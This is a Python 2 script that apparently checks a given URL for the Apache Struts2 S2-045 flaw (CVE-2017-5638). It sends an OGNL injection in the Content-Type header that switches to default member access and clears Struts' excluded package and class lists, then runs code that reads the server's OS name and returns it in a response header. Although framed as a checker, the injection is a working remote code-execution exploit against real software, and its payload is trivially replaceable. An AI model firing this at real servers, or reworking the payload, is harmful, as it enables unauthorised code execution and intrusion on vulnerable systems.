#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import urllib,urllib2

def connect(url,header = {},postdata = {}):
    postdata = urllib.urlencode(postdata)
    try:
        if postdata:
            request = urllib2.Request(url,headers = header,data = postdata)
        else:
            request = urllib2.Request(url,headers = header)
        opener = urllib2.build_opener()
        response = opener.open(request)
    except:
        return "",{}
    page = response.read().decode("utf-8","ignore")
    info = dict(response.info())
    return page,info

def check(url):
    hack_text = "vulnerable_system"
    
    payload = "(#os=@java.lang.System@getProperty('os.name'))."
    payload += "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('{}', #os))".format(hack_text)
    
    content_type  = "%{(#_='multipart/form-data')."
    content_type += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    content_type += "(#_memberAccess?"
    content_type += "(#_memberAccess=#dm):"
    content_type += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    content_type += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    content_type += "(#ognlUtil.getExcludedPackageNames().clear())."
    content_type += "(#ognlUtil.getExcludedClasses().clear())."
    content_type += "(#context.setMemberAccess(#dm))))."
    content_type += payload
    content_type += "}"

    header = {"Content-Type" : content_type}
    page,info = connect(url,header,{})

    if info.get(hack_text):
        print "The system is vulnerable and the system is using {} !".format(info[hack_text])
    else:
        print "The system is not vulnerable..."

if len(sys.argv) != 2:
    print("[*] struts2_S2-045.py <url>")
else:
    print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
    url = sys.argv[1]
    check(url)
